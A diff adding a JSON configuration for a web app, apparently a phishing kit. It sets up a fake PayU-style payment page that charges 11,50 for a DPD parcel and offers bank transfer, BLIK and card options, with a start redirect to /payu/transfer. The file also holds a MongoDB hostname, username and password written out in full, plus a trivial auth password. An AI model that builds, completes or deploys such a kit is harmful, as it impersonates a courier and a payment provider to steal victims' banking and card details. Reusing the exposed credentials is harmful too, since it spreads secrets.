@@ -1,0 +1,64 @@
+{
+	"Application": {
+		"express": {
+			"port": 80,
+			"domain": "http://localhost:80"
+		},
+		"cache": {
+			"host": "localhost",
+			"port": 6379
+		},
+		"database": {
+			"hostname": "cluster0.4heodhy.mongodb.net",
+			"port": 12345,
+			"username": "fakult4",
+			"password": "8pn1AR9c6tUhxrL7",
+			"database": "database"
+		},
+		"auth": {
+			"password": "password"
+		},
+		"startRedirect": {
+			"url": "/payu/transfer"
+		}
+	},
+	"Pages": {
+		"components": {
+			"configuration": {
+				"price": "11,50",
+				"receiver": "DPD Sp. ZOO - Przesylka gabaryt 847265",
+				"loginReturnUrl": "/"
+			},
+			"services": [
+				{
+					"title": "Przelew",
+					"description": "Wybierz swój bank",
+					"icon": "<svg><use xlink:href=\"#wire-transfer\"></use></svg>",
+					"href": "/transfer",
+					"disabled": "false"
+				},
+				{
+					"title": "Blik",
+					"description": "płatność kodem z aplikacji Twojego banku",
+					"icon": "<img src=\"/assets/img/blik.svg\" alt=\"BLIK\">",
+					"href": "/",
+					"disabled": "false"
+				},
+				{
+					"title": "Karta",
+					"description": "oraz portfele elektroniczne",
+					"icon": "<svg><use xlink:href=\"#card-visa-mc\"></use></svg>",
+					"href": "/creditcard",
+					"disabled": "false"
+				},
+				{
+					"title": "Google Pay",
+					"description": "Zapłać bezpiecznie dowolną kartą płatniczą",
+					"icon": "<img src=\"/assets/img/google-pay-button.svg\" alt=\"Google Pay\">",
+					"href": "/",
+					"disabled": "true"
+				}
+			]
+		}
+	}
+}
